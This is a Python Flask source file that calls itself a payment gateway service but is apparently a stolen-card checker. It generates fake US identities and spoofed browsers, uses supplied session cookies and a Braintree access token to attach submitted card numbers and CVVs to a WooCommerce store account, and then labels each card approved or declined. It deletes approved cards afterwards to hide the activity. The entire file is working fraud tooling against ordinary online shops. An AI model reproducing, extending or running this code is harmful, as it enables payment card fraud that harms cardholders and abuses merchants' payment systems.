import random
import re
import logging
from urllib.parse import urlparse
import requests
from faker import Faker
from lxml import html
from flask import Flask, request, jsonify
from functools import wraps
from datetime import datetime, timedelta
import time
import json

app = Flask(__name__)

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

# Response messages
APPROVED = '𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅'
DECLINED = '𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌'
ERROR = '𝙀𝙍𝙍𝙊𝙍 ⚠️'

# Configuration
REQUEST_TIMEOUT = 15
CACHE_EXPIRY = timedelta(minutes=30)

fake = Faker("en_US")
DOMAINS = ["gmail.com", "yahoo.com", "hotmail.com", "outlook.com"]

# Cache for geographic data
geo_data_cache = {
    'data': None,
    'last_updated': None
}

def validate_input(func):
    """Decorator to validate input parameters"""
    @wraps(func)
    def wrapper(*args, **kwargs):
        try:
            return func(*args, **kwargs)
        except Exception as e:
            logger.error(f"Validation error in {func.__name__}: {str(e)}")
            return None
    return wrapper

def rate_limited(max_per_minute):
    """Decorator to limit the rate of function calls"""
    interval = 60.0 / max_per_minute
    last_called = [0.0]

    def decorator(func):
        @wraps(func)
        def wrapped(*args, **kwargs):
            elapsed = time.time() - last_called[0]
            wait = interval - elapsed
            if wait > 0:
                time.sleep(wait)
            last_called[0] = time.time()
            return func(*args, **kwargs)
        return wrapped
    return decorator

def fetch_city_zipcode_data():
    """Fetch US geographic data from GitHub repository with caching"""
    now = datetime.now()
    
    if (geo_data_cache['data'] is not None and 
        geo_data_cache['last_updated'] is not None and
        (now - geo_data_cache['last_updated']) < CACHE_EXPIRY):
        return geo_data_cache['data']
    
    url = "https://raw.githubusercontent.com/ANYA-LZ/country-map/refs/heads/main/US.json"
    try:
        response = requests.get(url, timeout=REQUEST_TIMEOUT)
        response.raise_for_status()
        geo_data = response.json()
        
        geo_data_cache['data'] = geo_data
        geo_data_cache['last_updated'] = now
        
        return geo_data
    except requests.RequestException as e:
        logger.error(f"Failed to fetch geographic data: {str(e)}")
        return None

@validate_input
def generate_random_person():
    """Generate realistic US resident profile"""
    geo_data = fetch_city_zipcode_data()
    if not geo_data:
        logger.error("No geographic data available")
        return None

    state = random.choice(list(geo_data.keys()))
    city = random.choice(list(geo_data[state].keys()))
    zipcode = geo_data[state][city]

    return {
        'first_name': fake.first_name(),
        'last_name': fake.last_name(),
        'email': f"{fake.user_name()[:10]}@{random.choice(DOMAINS)}".lower(),
        'phone': _format_phone_number(zipcode),
        'address': fake.street_address(),
        'city': city,
        'state': state,
        'zipcode': zipcode,
        'country': "United States",
        'user_agent': fake.user_agent(),
    }

def _format_phone_number(zipcode):
    """Format phone number with area code matching zipcode"""
    base_num = fake.numerify("###-###-####")
    return f"({zipcode[:3]}) {base_num}"

@rate_limited(5)
def get_nonce(cookies, random_person, url):
    """Retrieve security nonce from WooCommerce endpoint"""
    try:
        parsed_url = urlparse(url)
        origin = f"{parsed_url.scheme}://{parsed_url.netloc}"
        
        headers = {
            'User-Agent': random_person['user_agent'],
            'Origin': origin,
            'Referer': url,
        }
        
        with requests.Session() as session:
            session.headers.update(headers)
            response = session.post(
                url,
                data={'_wc_user_reg': 'true'},
                cookies=cookies,
                timeout=REQUEST_TIMEOUT
            )
            response.raise_for_status()

        tree = html.fromstring(response.content)
        nonce = tree.xpath('//input[@id="woocommerce-add-payment-method-nonce"]/@value')
        if nonce:
            return nonce[0]
        logger.warning("Nonce not found in response")
        return None
    except requests.RequestException as e:
        logger.error(f"Request failed in get_nonce: {str(e)}")
        return None
    except Exception as e:
        logger.error(f"Unexpected error in get_nonce: {str(e)}")
        return None

def delete_payment_method(cookies, random_person, url):
    """Execute payment method deletion and return success status"""
    try:
        headers = {
            'User-Agent': random_person['user_agent'],
            'Referer': url,
        }
        
        with requests.Session() as session:
            session.headers.update(headers)
            
            # Get account page to find delete URL
            account_response = session.get(
                url,
                cookies=cookies,
                timeout=REQUEST_TIMEOUT
            )
            account_response.raise_for_status()
            
            tree = html.fromstring(account_response.content)
            delete_url = tree.xpath(
                '//td[contains(@class, "payment-method-actions")]'
                '//a[contains(@class, "delete")]/@href'
            )
            
            if not delete_url:
                logger.warning("Delete URL not found")
                return False
                
            # Execute deletion
            delete_response = session.get(
                delete_url[0],
                cookies=cookies,
                allow_redirects=True,
                timeout=REQUEST_TIMEOUT
            )
            delete_response.raise_for_status()
            
            return "Payment method deleted" in delete_response.text
            
    except requests.RequestException as e:
        logger.error(f"Request failed in delete_payment_method: {str(e)}")
        return False
    except Exception as e:
        logger.error(f"Unexpected error in delete_payment_method: {str(e)}")
        return False

@validate_input
def get_token(card_number, month, year, cvv, random_person, access_token):
    """Generate payment token through Braintree API"""
    # Validate inputs
    if not all([card_number, month, year, cvv, random_person, access_token]):
        logger.error("Missing required parameters in get_token")
        return None, None
    
    if not isinstance(random_person, dict) or 'zipcode' not in random_person:
        logger.error("Invalid random_person parameter")
        return None, None

    headers = {
        'Authorization': f'Bearer {access_token}',
        'braintree-version': '2018-05-10',
        'Content-Type': 'application/json',
    }

    payload = {
        "clientSdkMetadata": {
            "source": "client",
            "integration": "custom",
            "sessionId": fake.uuid4()
        },
        "query": "mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }",
        "variables": {
            "input": {
            "creditCard": {
                "number": card_number,
                "expirationMonth": month,
                "expirationYear": year,
                "cvv": cvv,
                "billingAddress": {
                "postalCode": random_person['zipcode'],
                "streetAddress": ""
                }
            },
            "options": {
                "validate": False
            }
            }
        },
        "operationName": "TokenizeCreditCard"
    }

    try:
        response = requests.post(
            'https://payments.braintree-api.com/graphql',
            headers=headers,
            json=payload,
            timeout=REQUEST_TIMEOUT
        )
        response.raise_for_status()
        response_data = response.json()
        
        # Validate response structure
        if not response_data.get('data', {}).get('tokenizeCreditCard'):
            logger.error("Unexpected response structure from Braintree API")
            return None, None
            
        token_data = response_data['data']['tokenizeCreditCard']
        brandCode = token_data['creditCard']['brandCode']
        token = token_data['token']
        return token, brandCode
        
    except requests.RequestException as e:
        logger.error(f"Request failed in get_token: {str(e)}")
        return None, None
    except (KeyError, ValueError) as e:
        logger.error(f"Invalid response data: {str(e)}")
        return None, None
    
def get_client_payload(auth_token):

    url = "https://payments.braintree-api.com/graphql"
    
    # GraphQL query payload
    payload = {
        "clientSdkMetadata": {
            "source": "client",
            "integration": "custom",
            "sessionId": str(fake.uuid4())
        },
        "query": "query ClientConfiguration { clientConfiguration { analyticsUrl environment merchantId assetsUrl clientApiUrl creditCard { supportedCardBrands challenges threeDSecureEnabled threeDSecure { cardinalAuthenticationJWT } } applePayWeb { countryCode currencyCode merchantIdentifier supportedCardBrands } paypal { displayName clientId assetsUrl environment environmentNoNetwork unvettedMerchant braintreeClientId billingAgreementsEnabled merchantAccountId currencyCode payeeEmail } supportedFeatures } }",
        "operationName": "ClientConfiguration"
    }

    headers = {
        "Authorization": f"Bearer {auth_token}",
        "braintree-version": "2018-05-10",
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
    }

    try:
        response = requests.post(
            url,
            json=payload,
            headers=headers,
            timeout=10
        )

        # Check for HTTP errors
        response.raise_for_status()

        # Parse JSON response
        config_data = response.json()

        # Validate response structure
        if "data" not in config_data or "clientConfiguration" not in config_data["data"]:
            raise ValueError("Invalid response structure from Braintree API")

        return config_data["data"]["clientConfiguration"]

    except requests.exceptions.RequestException as e:
        print(f"Request failed: {str(e)}")
        return None
    except json.JSONDecodeError as e:
        print(f"Failed to parse JSON response: {str(e)}")
        return None
    except ValueError as e:
        print(f"Invalid response data: {str(e)}")
        return None
    
def generate_payload_payment(token, nonce, payload_config, version, brandCode):
    if "v1" in version:
        payload = {
            'payment_method': "braintree_credit_card",
            'wc-braintree-credit-card-card-type': brandCode,
            'wc-braintree-credit-card-3d-secure-enabled': "",
            'wc-braintree-credit-card-3d-secure-verified': "",
            'wc-braintree-credit-card-3d-secure-order-total': "0.00",
            'wc_braintree_credit_card_payment_nonce': token,
            'wc_braintree_device_data': f"{{\"correlation_id\":\"{str(fake.uuid4())}\"}}",
            'wc-braintree-credit-card-tokenize-payment-method': "true",
            'wc_braintree_paypal_payment_nonce': "",
            'wc_braintree_device_data': f"{{\"correlation_id\":\"{str(fake.uuid4())}\"}}",
            'wc-braintree-paypal-context': "shortcode",
            'wc_braintree_paypal_amount': "0.00",
            'wc_braintree_paypal_currency': "USD",
            'wc_braintree_paypal_locale': "en_us",
            'wc-braintree-paypal-tokenize-payment-method': "true",
            'woocommerce-add-payment-method-nonce': nonce,
            '_wp_http_referer': "/my-account/add-payment-method/",
            'woocommerce_add_payment_method': "1"
        }
    if "v2" in version:
        config_data = {
            "environment": payload_config["environment"],
            "clientApiUrl": payload_config["clientApiUrl"],
            "assetsUrl": payload_config["assetsUrl"],
            "merchantId": payload_config["merchantId"],
            "analytics": {"url": payload_config["analyticsUrl"]},
            "creditCards": {
                "supportedCardTypes": payload_config["creditCard"]["supportedCardBrands"]
            },
            "challenges": payload_config["creditCard"]["challenges"],
            "threeDSecureEnabled": payload_config["creditCard"]["threeDSecureEnabled"],
            "paypal": payload_config["paypal"],
            "applePayWeb": payload_config["applePayWeb"]
        }
        
        payload = {
            "payment_method": "braintree_cc",
            "braintree_cc_nonce_key": token,
            "braintree_cc_device_data": json.dumps({
                "device_session_id": str(fake.uuid4()),
                "correlation_id": str(fake.uuid4())
            }),
            "braintree_cc_config_data": json.dumps(config_data),
            "woocommerce-add-payment-method-nonce": nonce,
            "_wp_http_referer": "/my-account/add-payment-method/",
            "woocommerce_add_payment_method": "1"
        }
    return payload
    
def process_payment(random_person, cookies,url, success_xpath, error_xpath, payload):
    """Execute payment processing through WooCommerce endpoint"""
    parsed_url = urlparse(url)
    origin = f"{parsed_url.scheme}://{parsed_url.netloc}"
    
    headers = {
        'User-Agent': random_person['user_agent'],
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.9',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Origin': origin,
        'Referer': url,
    }

    try:
        response = requests.post(
            url,
            headers=headers,
            cookies=cookies,
            data=payload,
            timeout=REQUEST_TIMEOUT
        )
        response.raise_for_status()
        return _parse_payment_response(response.content, cookies, random_person, success_xpath, error_xpath, origin)
    except requests.RequestException as e:
        logger.error(f"Payment request failed: {str(e)}")
        return ERROR, f"Request failed: {str(e)}"

def _parse_payment_response(content, cookies, random_person, success_xpath, error_xpath, origin):
    """Parse and interpret payment gateway response"""
    try:
        tree = html.fromstring(content)
        extracted_message = "Unknown response"

        print(origin)

        # Check for success
        success = tree.xpath(success_xpath)
        if success:
            message = 'Approved'
            if not delete_payment_method(cookies, random_person, f"{origin}/my-account/payment-methods/"):
                message = 'Approved (error delete)'
            return APPROVED, message

        # Check for errors
        error = tree.xpath(error_xpath)
        if error:
            error_message = error[0].strip()
            match = re.search(r":\s*(.*?)(?=\s*\(|$)", error_message)
            extracted_message = match.group(1) if match else error_message
            
            if "Duplicate card exists in the vault" in extracted_message:
                extracted_message = 'Approved old try again'
                if not delete_payment_method(cookies, random_person, f"{origin}/my-account/payment-methods/"):
                    extracted_message = 'Approved old try again (error delete)'
                return APPROVED, extracted_message

            return DECLINED, extracted_message
        
        # No success or error found
        logger.warning("No success or error message found in response")
        return ERROR, extracted_message
        
    except Exception as e:
        logger.error(f"Response parsing failed: {str(e)}")
        return ERROR, f"Parsing failed: {str(e)}"

@app.route('/')
def index():
    return "Payment Gateway Service"

@app.route('/payment', methods=['POST'])
def handle_payment():
    start_time = time.time()
    logger.info("Received payment request")
    
    try:
        data = request.get_json()
        if not data:
            logger.error("No data received in request")
            return jsonify({"status": ERROR, "result": "No data received"}), 400
        
        # Validate gateway configuration
        gateway_config = data.get('gateway_config')
        if not gateway_config:
            logger.error("Missing gateway configuration")
            return jsonify({"status": ERROR, "result": "Gateway configuration is missing"}), 400
        
        required_gateway_fields = ['cookies', 'url', 'access_token', 'success_message', 'error_message']
        for field in required_gateway_fields:
            if field not in gateway_config:
                logger.error(f"Missing required field in gateway config: {field}")
                return jsonify({"status": ERROR, "result": f"{field} is missing in gateway config"}), 400
        
        # Validate cookies
        cookies_list = gateway_config.get("cookies", [])
        if not cookies_list:
            logger.error("No cookies provided")
            return jsonify({"status": ERROR, "result": "Cookies are missing in gateway config"}), 400
        
        cookies_dict = {}
        for cookie in cookies_list:
            if 'name' not in cookie or 'value' not in cookie:
                logger.error("Invalid cookie format")
                return jsonify({"status": ERROR, "result": "Invalid cookie format"}), 400
            cookies_dict[cookie["name"]] = cookie["value"]
        
        # Validate card information
        card_info = data.get('card')
        if not card_info:
            logger.error("No card information provided")
            return jsonify({"status": ERROR, "result": "Card information is missing"}), 400
        
        required_card_fields = ['number', 'month', 'year', 'cvv']
        for field in required_card_fields:
            if field not in card_info or not card_info[field]:
                logger.error(f"Missing required card field: {field}")
                return jsonify({"status": ERROR, "result": f"{field} is missing in card info"}), 400
        
        # Generate random person profile
        random_person = generate_random_person()
        if not random_person:
            logger.error("Failed to generate random person profile")
            return jsonify({"status": ERROR, "result": "Failed to generate random person"}), 400
        
        # Get nonce
        nonce = get_nonce(cookies_dict, random_person, gateway_config["url"])
        if not nonce:
            logger.error("Failed to get nonce")
            return jsonify({"status": ERROR, "result": "Failed to fetch nonce"}), 400
        
        # Get token
        token, brandCode = get_token(
            card_info["number"],
            card_info["month"],
            card_info["year"],
            card_info["cvv"],
            random_person,
            gateway_config["access_token"]
        )

        if not token or not brandCode:
            logger.error("Failed to get token or brand code")
            return jsonify({"status": ERROR, "result": "Failed to fetch token or brand code"}), 400
        
        payload_config = get_client_payload(gateway_config["access_token"])
        if not payload_config:
            logger.error("Failed to get client payload")
            return jsonify({"status": ERROR, "result": "Failed to fetch client payload"}), 400
        
        payload = generate_payload_payment(token, nonce, payload_config, gateway_config["version"], brandCode)
        
        # Process payment
        status, result = process_payment(
            random_person,
            cookies_dict,
            gateway_config["url"],
            gateway_config["success_message"],
            gateway_config["error_message"],
            payload,
        )
        
        logger.info(f"Payment processed - Status: {status}, Result: {result}")
        logger.info(f"Request processing time: {time.time() - start_time:.2f} seconds")
        
        return jsonify({
            "status": status,
            "result": result,
        }), 200
        
    except Exception as e:
        logger.error(f"Unexpected error in handle_payment: {str(e)}", exc_info=True)
        return jsonify({
            "status": ERROR,
            "result": "Internal server error"
        }), 500

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=False)